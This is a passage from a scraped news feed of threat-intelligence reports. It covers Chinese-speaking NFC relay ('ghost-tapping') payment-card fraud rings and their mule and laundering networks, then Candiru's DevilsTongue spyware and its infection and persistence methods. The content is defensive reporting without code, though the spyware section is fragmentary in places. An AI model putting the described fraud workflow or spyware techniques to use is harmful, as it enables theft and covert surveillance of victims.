systems.\nFigure 14: An example of automated attempts to add a compromised payment card belonging to DBS Bank to Apple Pay at intervals of four to eight minutes via SMS; this automation technique can likely be applied to any banking institution (Source: Recorded Future Proprietary Data)\nEngagement\nInsikt Group engaged with @webu8 to find out more about ghost-tapping. The threat actor claimed that their ghost-tapping technique can be applied in any country and that the scheme involves a type of proprietary software capable of relaying payment card data to other mobile devices, which they develop and update regularly. The threat actor mentioned they would lend the proprietary software to us for free if we purchased compromised payment card credentials from them, and a member of their team would guide us on how to use it.\nFrom this engagement, we learned that this threat group not only sells burner phones loaded with compromised payment card details, as shown in Figure 13, but also sells compromised payment card details directly to other Chinese syndicates through the use of proprietary software capable of relaying payment card information in real time. This criminal group orchestrating ghost-tapping schemes is unwilling to hire mules to conduct retail fraud using ghost-tapping methods by themselves and does not bear any risk of getting caught by law enforcement agencies while conducting retail fraud.\nChinese-speaking syndicates that purchase compromised payment card information, or burner phones loaded with compromised card information from this ghost-tapping threat group, are responsible for sending ghost-tapping mules to commit retail fraud or contactless NFC ATM withdrawal in person, where mules bear the greatest risk of being arrested by law enforcement agencies.\nDue to the threat actor’s request to meet in person to discuss more business details in Cambodia, we assess with high confidence that well-established Chinese-speaking syndicates operating in Southeast Asia have members physically located in Cambodia who could discuss terms and conditions further. We also interpret the request for a physical meetup as a method used by the threat actor to filter out less-prominent criminal gangs and as a desire to conduct business with more well-established syndicates on a much larger scale to maximize their profits.\nAccording to Cleafy, the “SuperCard X” MaaS offering was created by a Chinese-speaking threat actor and shares similarities with the proprietary software @webu8 mentioned. According to Cleafy, the “Reader” application contains an embedded file that stores multiple “Answer To Reset” (ATR) messages. These messages, typically used to initiate and negotiate communication parameters between a smart card and an NFC reader, are reused to facilitate card emulation. When the \"Reader\" captures and relays a victim’s card data, the corresponding ATR is transmitted via the command-and-control (C2) infrastructure to the \"Tapper\" device that is going to use this message to emulate a virtual card, effectively deceiving POS terminals or ATMs into recognizing it as a legitimate physical card. By leveraging ATRs, SuperCard X enables seamless, real-time relay attacks, allowing threat actors to bypass physical proximity constraints and carry out fraudulent transactions. Insikt Group is unable to confirm whether the SuperCard X platform application is the proprietary software used by @webu8 due to the existence of multiple ghost-tapping criminals advertising similar schemes on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee.\nCleafy also identified a SuperCard X campaign targeting Italy and found evidence that suggests custom builds tailored for specific affiliates or regional operations. This research corroborates @webu8’s claim that their ghost-tapping attack vector could be conducted anywhere in the world and that such proprietary software could be loaned to non-Chinese-speaking syndicates.\nInsikt Group also published a report titled “SuperCard X MaaS Expands Infrastructure, Likely Targeting High-Profile Organizations,” which builds upon Cleafy’s research on the SuperCard X campaign.\n@xingma888: Reseller and Mule Controller\nBackground\nOn Xinbi Guarantee, we engaged with the threat actor “星马集团” (@xingma888; translates to “Singapore and Malaysian organization”), who is involved with laundering funds into physical goods and cashing out. Through our conversations, we identified that the threat actor is part of a Chinese-speaking ghost-tapping syndicate that operates in Singapore and Malaysia. This threat actor engagement sheds light on how Chinese-speaking syndicates operate and how platforms such as Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee facilitate ghost-tapping campaigns and other forms of cybercrime.\nFigure 15: @xingma888 is a member of Xinbi Guarantee and is open to using Xinbi, Huione, or Tudou Guarantee’s escrow service to deal with other Chinese-speaking threat actors (Source: Recorded Future)\nEngagement\nDuring an engagement, we learned that @xingma888 is able to supply a “motorcade” (车队) — mules for ghost-tapping campaigns to make in-person purchases at retail stores in Singapore and Malaysia. Threat actors requiring such services will have to specify what kind of physical goods they wish to obtain, and @xingma888 will quote the deposit amount required to mobilise the mules for the ghost-tapping campaign. The deposit amount must be paid in USDT to an escrow system belonging to either Huione, Tudou, or Xinbi Guarantee. In a manner similar to placing an order, the buyer has to provide a physical address for mules working for @xingma888 to deliver the physical goods. @xingma888 stated that after successfully delivering the goods, the buyer should take a video of the unboxing process and verify the authenticity of the items, then proceed to ask the customer service officer belonging to an escrow system of the buyer’s choice to release the amount of USDT to @xingma888.\nTaking into account details of multiple threat engagements with different cybercriminals involved in ghost-tapping campaigns, as well as open-source articles reporting about syndicates funding transportation costs and air tickets for mules, Insikt Group assesses with a high level of confidence that @xingma888 funds the following:\nBurner phones loaded with stolen payment card credentials\nTransportation costs, such as airline tickets for mules\nAccommodation for mules\nUSDT or cash to recruit and pay mules\nA money mule to launder USDT into fiat currency\nMeanwhile, prospective buyers, which usually refers to Chinese syndicates, will be able to resell the physical goods bought via ghost-tapping campaigns for cash, successfully converting USDT into fiat currency through this cash-out method. In most cases, the prospective buyer will have to pay a greater amount of USDT to mule handlers such as @xingma888. We also assess that syndicates will likely need to recruit reseller mules to resell the physical goods for cash. Insikt Group has yet to factor in the cost of obtaining USDT in the first place, which is most likely obtained through illicit means involving cybercrime, illegal online gambling, and scams, where Southeast Asia is a hotbed for Chinese criminal gangs.\nFigure 16 illustrates how a Telegram-based escrow system, such as Xinbi Guarantee, helps to facilitate and mediate transactions between Chinese-speaking syndicates and mule controllers, such as @xingma888, looking to work together, as well as an overview of the financial gains each party receives during the process.\nFigure 16: Overview of mutual gains when syndicates work with mule controllers such as @xingma888 to cash out illicitly obtained USDT for fiat currency through ghost-tapping campaigns based on our threat actor engagement (Source: Recorded Future)\nMitigations\nFor banks and payment providers:\nBanks should introduce security measures to prevent payment card phishing fraud, such as a security feature that requires the individual to log in to their own bank account to authorize the linking of their payment card to a mobile wallet. This feature should turn off automatically if the card is not added to any mobile wallet within a designated short time frame.\nCard issuers should consider alternatives to SMS- or email-based OTPs for device wallet authentication and activation. These may include automated or “manned” calls with customer service or push provisioning from the issuer’s official mobile application, which are less susceptible to phishing.\nIn scenarios where SMS- or email-based OTPs are still used, card issuers should consider placing the OTP in the second half of messages and excluding it from preview text on mobile home screens, increasing the chance that a cardholder notices suspicious activity.\nAnalyze device risk factors before allowing a payment card to be added to a digital wallet. Enforce stricter authentication when a card is being added from an unrecognized device or location.\nFlag transactions where the same payment card is used in geographically distant locations within an unrealistic timeframe.\nAnalyze patterns where multiple cards are linked to the same device, particularly following known phishing incidents.\nLeverage machine learning models to recognize the characteristics of relayed payments and device behavior anomalies related to NFC relay fraud.\nAllow customers to verify high-risk transactions or digital wallet provisioning attempts via their banking app before finalizing them.\nFor consumers:\nIndividuals should contact their respective banking institutions and block their access to their compromised payment cards as soon as they receive notifications of unauthorized use.\nIndividuals should not download third-party mobile applications outside official App stores.\nIndividuals should not add payment card information to any unknown or untrustworthy websites and should not share any OTPs or PINs with anyone. Changing their payment card PIN regularly and monitoring payment card transactions can help reduce the chance of payment card phishing.\nIndividuals should be wary of scammers impersonating bank personnel and should contact the bank through their official banking hotline to obtain and clarify information regarding their own banking matters.\nFor law enforcement:\nCollaborate with payment networks, financial institutions, and digital platforms to identify and track emerging trends related to NFC relay fraud and payment card phishing.\nSupport efforts to dismantle infrastructure used to distribute phishing kits and mobile malware used in payment credential theft schemes.\nOutlook\nInsikt Group believes that Chinese-speaking syndicates are pivoting toward using ghost-tapping as an attack vector to commit retail fraud and launder funds from goods purchased with compromised payment cards. We assess that ghost-tapping criminals can capitalize on data breaches belonging to banks and telecommunications firms to obtain PII and use social engineering techniques to steal payment card information via phishing. Data breaches of telecommunications companies involving databases belonging to customers may increase the risk of SIM swapping, where cybercriminals can potentially add, link, and authenticate payment card information remotely to burner phones.\nDespite the shutdown of Huione Guarantee’s operations on May 13, 2025, we observed cybercriminals quickly pivoting toward alternative Telegram-based escrow systems such as Xinbi Guarantee and Tudou Guarantee. These platforms continue to empower cybercriminals to conduct transactions and recruit mules for ghost-tapping operations. Due to these marketplaces being criminal sources and claiming to be a trusted platform, there remains the possibility of them ceasing operations, like Huione Guarantee, while events such as Telegram clamping down on channels linked to these two platforms can temporarily disrupt ghost-tapping campaigns. If these two marketplaces were to cease operations, Chinese-speaking syndicates would likely pivot to different platforms that have stronger operation security measures, which could result in less visibility for researchers and law enforcement agencies to monitor ghost-tapping-related intelligence.\nSuccess in ghost-tapping campaigns will bring about more financial resources to both syndicates and cybercriminals. Ghost-tapping is likely going to expand globally, with threat actors offering custom-built tooling to tailor to non-Chinese speaking syndicates and regional operations. Conversely, if banks around the world introduce more stringent measures to prevent payment card phishing fraud in a manner similar to DBS’s security feature, the overall success rate of linking compromised payment card credentials to any contactless payment system would be lowered.\nTo read the entire analysis, click here to download the report as a PDF.\nAppendix A: Glossary of Terms\nChinese\nDirect Translation\nDefinition\nNFC远程刷卡\nRemote NFC Swiping\nUsing ghost-tapping techniques to obtain physical goods\nATM无卡 取现车\nContactless ATM withdrawal crew\nMules are hired to withdraw cash from ATMs using contactless payment\n招 NFC 无卡取现\nRecruiting mules withdrawing cash using NFC methods\n实物\nPhysical goods\n车手\nDriver\nMules to do ATM withdrawals or conduct ghost-tapping have to be conducted in person\n车队\nMotorcade\nA group of mules hired by multiple syndicates to perform tasks on behalf of the syndicates who hired them\n奢饰品\nLuxury goods\nLuxury goods\n实物,黄金, 手机, 奢饰品\nPhysical goods, gold, mobile phones, luxury items\n跑分;洗料\nRunner; wash materials\nMoney laundering, converting stolen card information into physical goods, USDT, or cash\n料\n            \nMaterial\nBank accounts, passwords, mobile phone numbers, and identity card numbers\n一道\nFirst-hand\nObtained directly from the source, usually referring to payment cards and databases\n二道\nSecond-hand\nObtained directly from a first-hand seller, usually referring to payment cards and databases","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_11bf88f2501e3cb692866f74a7ff477ba8bbeb8fc.jpg?width=1200&format=pjpg&optimize=medium"},"content":"Explore how Chinese-speaking cybercriminals use NFC relay fraud (\"ghost-tapping\") to exploit mobile wallets, conduct retail fraud, and launder funds via Telegram.","contentSnippet":"Explore how Chinese-speaking cybercriminals use NFC relay fraud (\"ghost-tapping\") to exploit mobile wallets, conduct retail fraud, and launder funds via Telegram.","guid":"https://www.recordedfuture.com/research/ghost-tapping-chinese-criminal-ecosystem","categories":["Research (Insikt)"],"isoDate":"1970-01-21T07:32:09.000Z","tag":"intel"},{"title":"Tracking Candiru’s DevilsTongue Spyware in Multiple Countries","link":"https://www.recordedfuture.com/research/tracking-candirus-devilstongue-spyware","pubDate":"Wed, 21 Jan 1970 07:19:12 GMT","content:encoded":"\n        <p>Note: The analysis cut-off date for this report was June 26, 2025</p>\n        <h2>Executive Summary</h2>\n        <p>Insikt Group identified new infrastructure associated with several clusters linked to the spyware vendor Candiru. This includes both victim-facing components likely used for deploying and controlling Candiru’s DevilsTongue spyware, as well as higher-tier operator infrastructure. DevilsTongue is a sophisticated, modular Windows malware. The clusters vary in design and administration, with some directly managing victim-facing systems, while others use intermediaries or the Tor network. Eight distinct clusters were identified, with five being likely still active, including those linked to Hungary and Saudi Arabia. One cluster tied to Indonesia was active until November 2024, and two associated with Azerbaijan have uncertain status due to a lack of identified victim-facing infrastructure. Insikt Group also identified a company suspected to be part of Candiru’s corporate network</p>\n        <p>The use of mercenary spyware like DevilsTongue, both domestically and internationally, outside of serious crime or counterterrorism contexts, poses serious privacy, legal, and safety risks to targets, their organizations, and even the operators. Due to the high cost per deployment (based on researchers’ assessments of leaked sales information), individuals with high intelligence value, such as politicians, business leaders, and individuals in sensitive roles, are often particularly at risk. Despite regulatory and legal efforts worldwide, including the US Department of Commerce adding Candiru to its <a href=\"https://www.commerce.gov/news/press-releases/2021/11/commerce-adds-nso-group-and-other-foreign-companies-entity-list\">Entity List</a>, the EU's resolution to curb spyware abuse, and the UK- and France-led Pall Mall initiative to define and regulate legitimate use, Candiru has proven resilient, pushing back by trying to get removed from the entity list, for example, and continues to pose a significant threat.</p>\n        <p>In the short term, defenders should implement security best practices, including regular software updates, hunting for known indicators, pre-travel security briefings, and strict separation of personal and corporate devices. These measures should be supported by ongoing employee security awareness training to enhance understanding of infection vectors and malware capabilities and promote a culture of minimal data exposure. In the long term, organizations should invest in thorough risk assessments to inform more nuanced and adaptive security policies.</p>\n        <p>As the mercenary spyware market grows, with new vendors, products, and more countries seeking advanced cyber capabilities, the risk of being targeted now extends beyond civil society to anyone of interest to actors with access to such tools or their equivalents. At the same time, sustained profitability, rising competition, and stronger IT defenses are fueling innovation, as evidenced by alleged ad-based infections, direct attacks on messaging servers, and enhanced persistence (<a href=\"https://www.theregister.com/2023/09/16/insanet_spyware/#:~:text=To%20market%20its%20snoopware%2C%20Insanet%20reportedly%20teamed,euros%20($6.7%20million%2C%20%C2%A35.2%20million)%2C%20mind%20you.&amp;text=Unsuspecting%20users%20are%20definitely%20susceptible%20to%20such%20attacks.%22\">1</a>, <a href=\"https://citizenlab.ca/2025/06/first-forensic-confirmation-of-paragons-ios-mercenary-spyware-finds-journalists-targeted/\">2</a>, <a href=\"https://blog.talosintelligence.com/intellexa-and-cytrox-intel-agency-grade-spyware/\">3</a>). These trends are driving stealthier infection chains, targeting of cloud backups, a more professionalized spyware ecosystem, and broader tool portfolios. Effective mitigation, therefore, requires continuous ecosystem monitoring, thorough risk assessment, and stronger regulatory action from policymakers.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Insikt Group has identified new infrastructure linked to several operational clusters associated with Candiru, an Israeli-based spyware vendor.

The company's original name, Candiru, <a href=\"https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/\">draws</a> from a notorious parasitic fish known for its stealth and invasiveness, a metaphor for the company’s spyware capabilities. Isaac Zack, an early investor in NSO Group, was <a href=\"https://archive.ph/Syr70\">reported</a> to be serving as Candiru’s chairman. The company reportedly secured funding from the Founders Group, an angel syndicate co-founded by Omri Lavie and Shalev Hulio, the co-founders of NSO Group.

That same year, it reportedly generated $10 million in revenue, which increased to $20–30 million by 2018, with an additional $367 million in pending deals involving 60 government clients. Negotiations were often conducted through local intermediaries.</p>\n        <p>In 2017, Candiru is believed to have <a href=\"https://archive.ph/Syr70\">started</a> developing spyware for mobile devices, a development later confirmed by Israeli newspaper Haaretz, based on leaked internal documents.

(גרינדוויק פתרונות בעיימ).</p>\n        <p>By 2019, Candiru was valued at approximately $90 million, following the sale of a 10% equity stake by venture capitalist Eli Wartman to Universal Motors Israel (UMI). Reports also suggest investment from the Qatari sovereign wealth fund. That same year, Vice News <a href=\"https://www.vice.com/en/article/uzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec/\">reported</a> that Kaspersky Lab had identified Candiru spyware in use by the Uzbekistan State Security Service (SSS). The SSS had reportedly used Kaspersky antivirus software to test the spyware's stealth and had configured an official government domain (\"itt[.]uz\") for its C2 communications. This leak led to the identification of other Candiru clients, including Saudi Arabia and the United Arab Emirates (UAE). The company <a href=\"https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/\">renamed</a> itself to Taveta Ltd.

For example, one €16 million proposal allows for unlimited infection attempts but limits monitoring to ten devices simultaneously. Customers can expand this capacity: for an additional €1.5 million, they can monitor fifteen more devices and gain authorization to target one additional country; for €5.5 million, they can monitor 25 more devices and operate in five additional countries (see Figure 3). Another €1.5 million upgrade offers a remote shell capability, granting full command-line access to infected devices, raising particular concern due to its potential use for uploading files or planting incriminating content.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_15183feaa64f053701756cb39c5795b7fccdaed46.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1494\" height=\"384\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 3:</em></strong> <em>Candiru pricing options (Source:</em> <em><a href=\"https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/\">Citizen Lab</a>)</em></div>\n          </div>\n        </div>\n        <p>The leaked proposal further states that the product is intended to operate solely within “agreed upon territories,” explicitly listing the US, Russia, China, Israel, and Iran as restricted countries.

Corroborating this, the targeting infrastructure analyzed in Citizen Lab’s report from 2021 <a href=\"https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/\">includes</a> domains impersonating the Russian postal service. That report also details the targeting of a Catalan technologist while he was living in the US, as mentioned above.</p>\n        <h3>DevilsTongue</h3>\n        <p>DevilsTongue, the name given by Microsoft to the Windows-based spyware developed by Candiru, is a complex, modular, multi-threaded malware written in C and C++ with a wide range of capabilities. Most of what is known about DevilsTongue stems from Microsoft's analysis and a leaked Candiru project proposal published by TheMarker. However, given the extensive list of suspected components and features, and the age of both reports, Insikt Group assesses that the malware's capabilities have likely evolved since then.</p>\n        <p>The leaked documents reveal that Candiru’s spyware was designed for deep access to victim devices, enabling file extraction, browser data collection, and even the theft of encrypted messages from the Signal Messenger desktop app. Figure 4 presents an excerpt from the leaked Candiru project proposal outlining the spyware’s Windows-specific capabilities.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_14df9be3050c358ed486a609a5beecc10a63531ef.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"954\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 4:</em></strong> <em>Candiru’s capabilities on Windows devices (Source:</em> <em><a href=\"https://citizenlab.ca/2022/04/catalangate-extensive-mercenary-spyware-operation-against-catalans-using-pegasus-candiru/#finding-catalans-targeted-with-candiru\">Citizen Lab</a>)</em></div>\n          </div>\n        </div>\n        <p>According to Microsoft’s detailed analysis, DevilsTongue is a stealthy malware with both user- and kernel-mode components. It maintains persistence via COM hijacking by overwriting a legitimate COM class registry key’s DLL path with a first-stage DLL dropped in C:\\Windows\\system32\\IME\\, and it stores encrypted second-stage payloads in the configuration directory. A signed third-party driver (physmem.sys) enables kernel-level memory access and API call proxying to avoid detection. To preserve system stability, DevilsTongue reinjects the original COM DLL during hijacking, disguising this action through shellcode manipulation of the LoadLibraryExW return value. All additional payloads are decrypted and executed only in memory, allowing the malware to steal credentials from LSASS and browsers, access Signal messages, and use browser cookies to impersonate victims on platforms like Facebook, Gmail, and VK. The malware’s use of scrubbed metadata, encryption, and unique hashes for each file further complicates detection and analysis.</p>\n        <h4>Overlap with CHAINSHOT</h4>\n        <p>CHAINSHOT is an exploit kit that has previously been <a href=\"https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/\">associated</a> with Candiru. It has been observed in use by threat actor groups such as Stealth Falcon and SandCat, the latter believed to be linked to the Uzbek government. SandCat drew significant attention in 2019 due to a series of <a href=\"https://www.vice.com/en/article/uzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec/\">operational security errors</a> that not only exposed multiple zero-day vulnerabilities but also enabled direct attribution to Uzbekistan’s State Security Service (SSS). Notably, another threat actor known as PuzzleMaker has also been <a href=\"https://securelist.com/puzzlemaker-chrome-zero-day-exploit-chain/102771/\">mentioned</a> in connection with CHAINSHOT, due to the use of a rare but likely not exclusively used technique. Although the connection between CHAINSHOT and Candiru was initially circumstantial, researchers at Citizen Lab later established a clearer link. They identified a shared fingerprint, including a matching IP address, that tied CHAINSHOT’s final spyware delivery URL to infrastructure <a href=\"https://unit42.paloaltonetworks.com/unit42-slicing-dicing-cve-2018-5002-payloads-new-chainshot-malware/\">documented</a> in a 2018 report by Palo Alto Networks, thereby reinforcing the association between CHAINSHOT and Candiru.</p>\n        <h3>Initial Access Vectors</h3>\n        <p>According to the leaked materials discussed above, Candiru’s spyware can be <a href=\"https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/\">deployed</a> through multiple vectors, including malicious links, weaponized files, man-in-the-middle (MitM) attacks, and physical access. However, based on Insikt Group’s current knowledge, public reporting has only confirmed the use of the first two vectors in documented cases involving Candiru-related infections, although it is highly likely that the other vectors have also been employed. When it comes to malicious links, Candiru has used both actor-controlled links, such as spearphishing emails and strategic website compromises known as watering hole attacks, to deliver its spyware, with infections typically involving exploits that target web browsers (<a href=\"https://blog.google/threat-analysis-group/how-we-protect-users-0-day-attacks/\">1</a>, <a href=\"https://decoded.avast.io/janvojtesek/the-return-of-candiru-zero-days-in-the-middle-east/\">2</a>).</p>\n        <p>For instance, Google’s Threat Analysis Group (TAG) <a href=\"https://blog.google/threat-analysis-group/how-we-protect-users-0-day-attacks/\">disclosed</a> in 2021 that two Google Chrome renderer remote code execution zero-day vulnerabilities (CVE-2021-21166 and CVE-2021-30551) had been exploited by Candiru. These exploits were distributed via single-use links sent to specific targets, who were believed to be located in Armenia. The links directed recipients to attacker-controlled domains impersonating legitimate websites relevant to the victims’ interests. Google TAG discovered that CVE-2021-21166 also affected WebKit, prompting Apple to patch it as CVE-2021-1844; however, there is no evidence it was used against Safari users.</p>\n        <p>In April 2021, Google TAG <a href=\"https://blog.google/threat-analysis-group/how-we-protect-users-0-day-attacks/\">identified</a> a campaign targeting Armenian users with malicious Office documents that loaded web content through Internet Explorer. This was achieved either by embedding a remote ActiveX object using a Shell.Explorer.1 OLE object or by launching an Internet Explorer process via VBA macros to navigate to a web page. Following a fingerprinting phase, targets were served an Internet Explorer zero-day exploit, later assigned CVE-2021-33742 and patched by Microsoft in June 2021. TAG’s analysis indicates that the Internet Explorer exploits were developed and supplied by the same entity responsible for the previously mentioned Google Chrome exploits.</p>\n        <p>In July 2022, Avast <a href=\"https://decoded.avast.io/janvojtesek/the-return-of-candiru-zero-days-in-the-middle-east/\">reported</a> that CVE-2022-2294, a high-severity heap buffer overflow vulnerability in WebRTC within Google Chrome, was exploited to execute shellcode in the browser’s renderer process, targeting users in the Middle East. The exploit, designed specifically for Windows, was likely combined with a sandbox escape, though the second-stage exploit could not be recovered. In Lebanon, the attackers compromised a website used by employees of a news agency, which contained signs of persistent cross-site scripting (XSS) attacks, likely as part of their testing phase, before ultimately injecting malicious JavaScript from an attacker-controlled domain. This injected code selectively redirected intended victims through a chain of attacker-controlled domains to the exploit server. Prior to Avast’s report, ESET had <a href=\"https://www.eset.com/gr-en/about/newsroom/press-releases-1/eset-research-discovers-watering-hole-attacks-on-websites-in-the-middle-east-with-links-to-candiru-s/\">reported</a> on strategic web compromises across the Middle East, with a strong focus on Yemen, that they attributed to Candiru with medium confidence.</p>\n        <p>Beyond the previously mentioned vectors, reports from 2023 <a href=\"https://www.theregister.com/2023/09/16/insanet_spyware/#:~:text=To%20market%20its%20snoopware%2C%20Insanet%20reportedly%20teamed,euros%20($6.7%20million%2C%20%C2%A35.2%20million)%2C%20mind%20you.&amp;text=Unsuspecting%20users%20are%20definitely%20susceptible%20to%20such%20attacks.%22\">indicate</a> that Candiru also possessed a capability known as Sherlock.

This includes both victim-facing components likely used for deploying and controlling Candiru’s DevilsTongue spyware, as well as higher-tier operator infrastructure. DevilsTongue is a sophisticated, modular Windows malware. The clusters vary in design and administration, with some directly managing victim-facing systems, while others use intermediaries or the Tor network. Eight distinct clusters were identified, with five being likely still active, including those linked to Hungary and Saudi Arabia. One cluster tied to Indonesia was active until November 2024, and two associated with Azerbaijan have uncertain status due to a lack of identified victim-facing infrastructure. Insikt Group also identified a company suspected to be part of Candiru’s corporate network\nThe use of mercenary spyware like DevilsTongue, both domestically and internationally, outside of serious crime or counterterrorism contexts, poses serious privacy, legal, and safety risks to targets, their organizations, and even the operators. Due to the high cost per deployment (based on researchers’ assessments of leaked sales information), individuals with high intelligence value, such as politicians, business leaders, and individuals in sensitive roles, are often particularly at risk. Despite regulatory and legal efforts worldwide, including the US Department of Commerce adding Candiru to its Entity List, the EU's resolution to curb spyware abuse, and the UK- and France-led Pall Mall initiative to define and regulate legitimate use, Candiru has proven resilient, pushing back by trying to get removed from the entity list, for example, and continues to pose a significant threat.\nIn the short term, defenders should implement security best practices, including regular software updates, hunting for known indicators, pre-travel security briefings, and strict separation of personal and corporate devices. These measures should be supported by ongoing employee security awareness training to enhance understanding of infection vectors and malware capabilities and promote a culture of minimal data exposure. In the long term, organizations should invest in thorough risk assessments to inform more nuanced and adaptive security policies.\nAs the mercenary spyware market grows, with new vendors, products, and more countries seeking advanced cyber capabilities, the risk of being targeted now extends beyond civil society to anyone of interest to actors with access to such tools or their equivalents. At the same time, sustained profitability, rising competition, and stronger IT defenses are fueling innovation, as evidenced by alleged ad-based infections, direct attacks on messaging servers, and enhanced persistence (1, 2, 3). These trends are driving stealthier infection chains, targeting of cloud backups, a more professionalized spyware ecosystem, and broader tool portfolios. Effective mitigation, therefore, requires continuous ecosystem monitoring, thorough risk assessment, and stronger regulatory action from policymakers.\nKey Findings\nInsikt Group has identified new infrastructure linked to several operational clusters associated with Candiru, an Israeli-based spyware vendor. This infrastructure includes both victim-facing components likely used in the deployment and C2 of Candiru’s DevilsTongue spyware, and higher-tier infrastructure used by the spyware operators.\nUsing Recorded Future Network Intelligence, Insikt Group identified significant differences in infrastructure design and administrative practices across the clusters. While some clusters manage their victim-facing infrastructure directly, others do so through intermediary infrastructure layers or via the Tor network.\nEight distinct clusters were identified. Five are assessed as highly likely to be currently active, including ones associated with Hungary and Saudi Arabia. One cluster, highly likely linked to a customer based in Indonesia, was active until November 2024, while two others, associated with Azerbaijan, remain of uncertain status.\nInsikt Group also identified a separate company suspected to be part of Candiru’s broader corporate network. This entity was established around the same time Candiru’s assets were acquired by a US-based company, suggesting it may have played a role in the acquisition process\nBackground\nCandiru, the Company\nCandiru Ltd., now operating as Saito Tech Ltd., is an Israeli company that was founded in 2014 by Eran Shorer and Yaakov Weizmann. The company's original name, Candiru, draws from a notorious parasitic fish known for its stealth and invasiveness, a metaphor for the company’s spyware capabilities. Isaac Zack, an early investor in NSO Group, was reported to be serving as Candiru’s chairman. The company reportedly secured funding from the Founders Group, an angel syndicate co-founded by Omri Lavie and Shalev Hulio, the co-founders of NSO Group. Activity linked to the company is also tracked under the alias SOURGUM by Microsoft. In this report, Insikt Group uses the name Candiru, as this is the most widely known name for the company.\nOver time, Candiru has frequently relocated its offices and restructured its corporate registration to maintain operational secrecy (see Figure 1).\nFigure 1: Timeline of Candiru’s corporate registrations (Source: Recorded Future, derived from Citizen Lab)\nCourt filings from a lawsuit brought by a former senior employee revealed that Candiru grew from 12 employees in 2015 to 70 by 2018. The company began securing contracts with government clients across Europe, the Middle East, Asia, and Latin America as early as 2016. That same year, it reportedly generated $10 million in revenue, which increased to $20–30 million by 2018, with an additional $367 million in pending deals involving 60 government clients. Negotiations were often conducted through local intermediaries.\nIn 2017, Candiru is believed to have started developing spyware for mobile devices, a development later confirmed by Israeli newspaper Haaretz, based on leaked internal documents. That same year, Candiru re-registered as DF Associates Ltd. (ד. אפ אסוסיאייטס בעיימ).\nIn 2018, the company rebranded to Grindavik Solutions Ltd. (גרינדוויק פתרונות בעיימ).\nBy 2019, Candiru was valued at approximately $90 million, following the sale of a 10% equity stake by venture capitalist Eli Wartman to Universal Motors Israel (UMI). Reports also suggest investment from the Qatari sovereign wealth fund. That same year, Vice News reported that Kaspersky Lab had identified Candiru spyware in use by the Uzbekistan State Security Service (SSS). The SSS had reportedly used Kaspersky antivirus software to test the spyware's stealth and had configured an official government domain (\"itt[.]uz\") for its C2 communications. This leak led to the identification of other Candiru clients, including Saudi Arabia and the United Arab Emirates (UAE). The company renamed itself to Taveta Ltd. (טאבטה בעיימ) in 2019 as well.\nIn 2020, the company created a subsidiary named Sokoto. That same year, Candiru’s board included founders Shorer and Weizmann, chairman Isaac Zack, and a representative from Universal Motors Israel. Candiru also changed its name to Saito Tech Ltd. (סאייטו טק בעיימ).\nBy 2021, company filings listed Universal Motors Israel, ESOP Management and Trust Services Ltd. (which manages employee stock ownership programs), and Optas Industry Ltd. (a proxy for the Qatari fund) as minority shareholders.\nIn April 2021, cybersecurity firm ESET uncovered an espionage operation using Candiru spyware in a watering hole attack targeting the UK news outlet Middle East Eye, news outlets associated with the Houthis and Hezbollah, and a likely dissident media outlet in Saudi Arabia. Additional victims included the websites of an Iranian embassy, Italian and South African aerospace firms, and Syrian and Yemeni government websites.\nIn July 2021, Citizen Lab and Microsoft revealed that Candiru’s spyware had been widely deployed by multiple government clients, compromising at least 100 victims globally. The targets included politicians, human rights defenders, journalists, academics, embassy staff, and political dissidents. Microsoft reported that approximately half of the victims it observed were located in Palestine. The remaining victims were in Israel, Iran, Lebanon, Yemen, Spain (Catalonia), the United Kingdom, Türkiye, Armenia, and Singapore. The spyware's infrastructure was traced to several countries, including Saudi Arabia, Israel, the UAE, Hungary, and Indonesia. The domains used by Candiru also give a hint to the targets. Domains spoofed international media, advocacy organizations (including Black Lives Matter, Amnesty International, and Refugees International), gender studies events (including a conference on the topic), and international organizations (including the Office of the Special Envoy of the Secretary-General for Yemen, the UN, and the WHO).\nIn November 2021, the US Department of Commerce added both Candiru and NSO Group to its Entity List, citing their role in supplying spyware to foreign governments engaged in malicious activities.\nIn April 2022, Citizen Lab reported that members of the Catalan independence movement had been targeted with Candiru spyware as part of a domestic surveillance operation authorized by the Spanish government (see Figure 2). The campaign reportedly included surveillance of elected officials and political activists. Candiru specifically was used to target four Catalans working in the open-source and digital voting communities. One Catalan technologist, Elies Campo, was sent an email with a link that, if clicked, would have led to a Candiru infection while he resided in the US and had a US SIM card in his device. Additionally, Citizen Lab reported on suspected targeting of Saudi Arabian social media users.\nFigure 2: Timeline of Candiru targeting (Source: Recorded Future)\nSuspected New Company After Acquisition\nIn April 2025, the technology news outlet CTech reported that Candiru had been acquired several months earlier by Integrity Partners in a $30 million deal. Notably, Integrity Partners, an American investment firm whose partners include Elad Yoran (brother of Amit Yoran, former CEO of Tenable), had also previously placed a bid to acquire Pegasus spyware developer NSO Group.\nThe reporting indicates that Integrity Partners acquired Candiru’s assets and transferred them, along with all company employees, to a newly established entity not currently subject to US government sanctions. By the time of the report, the first phase of the agreement had already been completed, involving the transition of employees to the new entity for $10 million. The second phase, which entails the transfer of Candiru’s export licenses, will be finalized once the necessary approvals are secured.\nNotably, WHOIS records associated with Nerfwall, an alias 